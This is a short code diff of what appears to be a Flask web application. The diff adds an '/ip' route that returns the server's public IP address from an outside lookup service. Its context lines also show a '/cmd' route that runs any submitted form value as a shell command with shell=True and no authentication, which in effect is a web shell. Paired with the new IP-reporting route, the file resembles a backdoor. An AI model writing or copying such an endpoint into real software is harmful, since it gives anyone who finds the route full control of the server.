@@ -14,6 +14,10 @@ def cmd():
     subprocess.Popen(request.form["cmd"], shell=True)
     return {"status": "ok"}
 
+@app.route("/ip")
+def ip():
+    return requests.get("https://api.ipify.org").text
+
 @app.route("/")
 def home():
     return {"message": "Hello, World!"}
